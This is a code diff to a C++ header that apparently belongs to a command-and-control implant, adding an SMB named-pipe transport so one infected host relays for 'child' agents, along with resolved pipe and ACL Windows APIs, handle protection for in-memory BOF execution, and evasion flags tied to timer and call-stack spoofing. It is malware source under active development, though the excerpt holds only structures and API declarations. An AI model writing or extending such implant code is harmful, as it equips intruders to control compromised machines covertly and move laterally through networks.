@@ -8,6 +8,7 @@
 #include <LdrLoad.h>
 #include <Hash.h>
 #include <wininet.h>
+#include <aclapi.h>
 #include <Spoof.h>
 
 // Magic value stored inside the agent we use to find it by scanning PEB heaps
@@ -23,6 +24,16 @@
 struct PAIN_HEADER {
     PCHAR Name;
     PCHAR Value;
+};
+
+// One connected SMB child session (parent relay role - linked list node)
+struct PAIN_SMB_DATA {
+    PCHAR           PipePath;   // "\\\\.\\pipe\\<name>" (heap copy)
+    PCHAR           AgentUUID;  // 36-char UUID extracted from child checkin (heap)
+    HANDLE          Handle;     // open pipe handle to the child
+    PVOID           CheckinBuf; // raw checkin payload forwarded to the server (heap)
+    UINT32          CheckinLen;
+    PAIN_SMB_DATA*  Next;
 };
 
 // One C2 endpoint entry parsed from the malleable profile blob
@@ -182,6 +193,15 @@ namespace Root
             DECLAPI( Thread32First            );
             DECLAPI( Thread32Next             );
             DECLAPI( OpenThread               );
+            // named pipe (SMB transport)
+            DECLAPI( CreateFileA         );
+            DECLAPI( CreateNamedPipeA    );
+            DECLAPI( PeekNamedPipe       );
+            DECLAPI( ConnectNamedPipe    );
+            DECLAPI( DisconnectNamedPipe );
+            DECLAPI( WaitNamedPipeA      );
+            // BOF handle protection - prevents CLR finalizers from closing our pipe
+            DECLAPI( SetHandleInformation );
         } Krnl32 = {
             RSL_TYPE( LoadLibraryA   ),
             RSL_TYPE( GetProcAddress ),
@@ -212,6 +232,13 @@ namespace Root
             RSL_TYPE( Thread32First            ),
             RSL_TYPE( Thread32Next             ),
             RSL_TYPE( OpenThread               ),
+            RSL_TYPE( CreateFileA         ),
+            RSL_TYPE( CreateNamedPipeA    ),
+            RSL_TYPE( PeekNamedPipe       ),
+            RSL_TYPE( ConnectNamedPipe    ),
+            RSL_TYPE( DisconnectNamedPipe ),
+            RSL_TYPE( WaitNamedPipeA      ),
+            RSL_TYPE( SetHandleInformation ),
         };
 
         struct {
@@ -226,10 +253,19 @@ namespace Root
             DECLAPI( GetUserNameA );
             DECLAPI( OpenProcessToken );
             DECLAPI( GetTokenInformation );
+            // pipe security descriptor (SMB transport)
+            DECLAPI( AllocateAndInitializeSid    );
+            DECLAPI( SetEntriesInAclA            );
+            DECLAPI( InitializeSecurityDescriptor );
+            DECLAPI( SetSecurityDescriptorDacl   );
         } Advapi32 = {
             RSL_TYPE( GetUserNameA ),
             RSL_TYPE( OpenProcessToken ),
             RSL_TYPE( GetTokenInformation ),
+            RSL_TYPE( AllocateAndInitializeSid    ),
+            RSL_TYPE( SetEntriesInAclA            ),
+            RSL_TYPE( InitializeSecurityDescriptor ),
+            RSL_TYPE( SetSecurityDescriptorDacl   ),
         };
 
         // wininet.dll - HTTP transport
@@ -291,6 +327,14 @@ namespace Root
             UINT32         RotationStrategy;  // 0=round-robin, 1=random, 2=failover
             UINT32         RngState;          // LCG state for random rotation
             PAIN_CALLBACK* Callbacks;         // heap-allocated array of PAIN_MAX_CALLBACKS entries
+
+            // SMB child role (populated by Config_Smb_Init when PAIN_PROFILE_C2 == PROFILE_SMB)
+            PCHAR   PipeName;    // heap-allocated pipe path (e.g. "\\\\.\\pipe\\pain")
+            HANDLE  PipeHandle;      // named pipe HANDLE; nullptr = not yet created
+            BOOL    TasksRead;       // alternating flag: FALSE=read tasks, TRUE=write results
+
+            // SMB parent relay role (pivot linked list - head node)
+            PVOID   SmbNode;     // PAIN_SMB_DATA* head; nullptr = no children linked
         } Config = {};
 
         // machine info - collected in Init()
@@ -309,6 +353,7 @@ namespace Root
             PVOID  OutputBuf;  // heap buffer that BeaconPrintf/BeaconOutput append to
             UINT32 OutputLen;  // bytes written so far
             UINT32 OutputCap;  // current buffer capacity
+            BOOL   BofRan;     // TRUE after a BOF ran; causes main loop to skip Timer Spoof once
         } Bof = {};
 
 
